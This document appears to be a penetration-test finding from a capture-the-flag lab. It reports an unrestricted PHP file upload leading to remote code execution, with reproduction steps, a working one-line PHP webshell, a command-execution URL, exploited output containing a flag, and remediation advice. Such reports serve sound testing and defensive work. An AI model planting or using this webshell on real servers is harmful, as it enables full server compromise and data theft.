# Remote Code Execution via Unrestricted File Upload

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2025-12-14 13:32:37 UTC

## Description

The application suffers from a critical unrestricted file upload vulnerability that allows unauthenticated attackers to upload arbitrary files, including server-side scripts (PHP). This results in Remote Code Execution (RCE).

**Vulnerable Endpoint:**
`POST /index.php`

**Vulnerable Parameter:**
`userfile` (file upload field)

**Steps to Reproduce:**
1. Create a PHP webshell file (e.g., `strix_rce.php`) with the content:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Navigate to `http://172.17.0.1:10041/index.php`.
3. Upload the file using the "Upload Image" form. The form field name must be `userfile`.
   - The application does not validate the file extension or content type, allowing `.php` files.
4. The server responds with the location of the uploaded file, e.g., `/upload/strix_rce.php`.
5. Access the shell to execute arbitrary system commands:
   `http://172.17.0.1:10041/upload/strix_rce.php?cmd=env`

**Proof of Concept:**
The vulnerability was successfully exploited to list environment variables and retrieve the capture-the-flag secret.

**Exploited Output:**
```
APACHE_CONFDIR=/etc/apache2
HOSTNAME=524f01259280
...
FLAG{3ea5dcbf70e8634b108b5200dc6a6dee53ef1cdc2581e350aa2fa726ad09e9ae}
```

**Impact:**
- Full compromise of the web server.
- Access to sensitive data (environment variables, files, database credentials).
- Ability to pivot to internal network resources.

**Remediation:**
- Implement a whitelist of safe file extensions (e.g., `.jpg`, `.png`, `.gif`).
- Verify file content (magic bytes) to ensure they match the allowed extensions.
- Store uploaded files outside the web root or disable script execution in the upload directory.
- Rename uploaded files to generated IDs to prevent overwriting or guessing.
